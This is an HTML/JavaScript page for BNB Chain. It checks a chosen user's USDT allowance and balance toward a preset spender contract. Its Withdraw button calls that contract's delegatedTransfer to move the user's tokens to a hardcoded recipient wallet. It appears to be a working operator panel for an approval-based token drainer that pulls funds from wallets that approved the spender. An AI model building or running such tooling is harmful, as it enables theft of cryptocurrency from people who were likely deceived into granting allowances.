<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>BEP-20 Allowance & Withdraw</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      padding: 1.5rem;
      margin: 0;
      background: #f5f5f5;
    }

    .container {
      max-width: 500px;
      margin: auto;
      background: white;
      border-radius: 10px;
      padding: 2rem;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }

    h2 {
      text-align: center;
      margin-bottom: 1.5rem;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 0.7rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }

    button {
      padding: 0.7rem 1.2rem;
      margin-top: 0.5rem;
      font-size: 1rem;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .btn-row {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
    }

    .btn-row button {
      flex: 1;
    }

    #output {
      margin-top: 1.5rem;
      font-weight: bold;
      text-align: center;
      white-space: pre-wrap;
    }

    @media (max-width: 600px) {
      .container {
        padding: 1rem;
      }

      button {
        font-size: 1rem;
        width: 100%;
      }

      .btn-row {
        flex-direction: column;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Token Allowance & Withdraw</h2>
    
    <label for="tokenAddress">USDT Contract Address:</label>
    <input type="text" id="tokenAddress" 
      value="0x55d398326f99059ff775485246999027b3197955" />

    <label>Client/user Address</label>
    <input id="fromAddress" placeholder="0x...">

    <label for="toAddress">Wallet Address/Contract Owner (Recipient):</label>
    <input type="text" id="toAddress" 
      value="0x827F20106A28452FB889d583360C3790AB09b47F" />
    
    <label>Amount (USDT)</label>
    <input id="amount" type="number" placeholder="e.g. 10">

    <label for="contractAddress">Spender Contract Address:</label>
    <input type="text" id="contractAddress" 
      value="0x65e8B2b53E9bd6d3C5CF68229602cba73Cd2dB1F" />

    <div class="btn-row">
      <button onclick="checkAllowance()">🔍 Check Allowance</button>
      <button onclick="withdraw()">💸 Withdraw</button>
    </div>

    <p id="output"></p>
  </div>

  <script>
    // The correct ABI for your spender contract
    const contractABI = [
      "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)"
    ];

    async function checkAllowance() {
      const tokenAddress = document.getElementById("tokenAddress").value;
      const from = document.getElementById("fromAddress").value;
      const spender = document.getElementById("contractAddress").value;

      if (!from || !ethers.utils.isAddress(from)) {
        document.getElementById("output").innerText = "❌ Please enter a valid user address.";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        
        const token = new ethers.Contract(tokenAddress, [
          "function allowance(address owner, address spender) external view returns (uint256)",
          "function balanceOf(address account) external view returns (uint256)",
          "function decimals() external view returns (uint8)"
        ], provider);

        const [allowance, balance, decimals] = await Promise.all([
          token.allowance(from, spender),
          token.balanceOf(from),
          token.decimals().catch(() => 18)
        ]);

        const allowanceFormatted = ethers.utils.formatUnits(allowance, decimals);
        const balanceFormatted = ethers.utils.formatUnits(balance, decimals);

        document.getElementById("output").innerText = 
          `✅ Allowance: ${allowanceFormatted} USDT\n💰 Balance: ${balanceFormatted} USDT`;
      } catch (err) {
        document.getElementById("output").innerText = "❌ Error checking allowance or balance.";
        console.error(err);
      }
    }

    async function withdraw() {
      const tokenAddress = document.getElementById("tokenAddress").value;
      const from = document.getElementById("fromAddress").value;
      const to = document.getElementById("toAddress").value;
      const amount = document.getElementById("amount").value;
      const contractAddress = document.getElementById("contractAddress").value;

      if (!amount || amount <= 0) {
        document.getElementById("output").innerText = "❌ Please enter a valid amount.";
        return;
      }

      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        
        // Use the correct contract instance with delegatedTransfer
        const contract = new ethers.Contract(contractAddress, contractABI, signer);

        document.getElementById("output").innerText = "⏳ Initiating transaction...";
        
        // Get decimals for proper parsing
        const token = new ethers.Contract(tokenAddress, ["function decimals() external view returns (uint8)"], provider);
        const decimals = await token.decimals().catch(() => 18);
        const amountParsed = ethers.utils.parseUnits(amount.toString(), decimals);

        const tx = await contract.delegatedTransfer(
          tokenAddress,
          from,
          to,
          amountParsed
        );
        
        document.getElementById("output").innerText = "⏳ Waiting for confirmation...";
        await tx.wait();
        document.getElementById("output").innerText = "✅ Withdraw successful!";
      } catch (err) {
        document.getElementById("output").innerText = "❌ Withdraw failed. Check console for details.";
        console.error(err);
      }
    }
  </script>
</body>
</html>
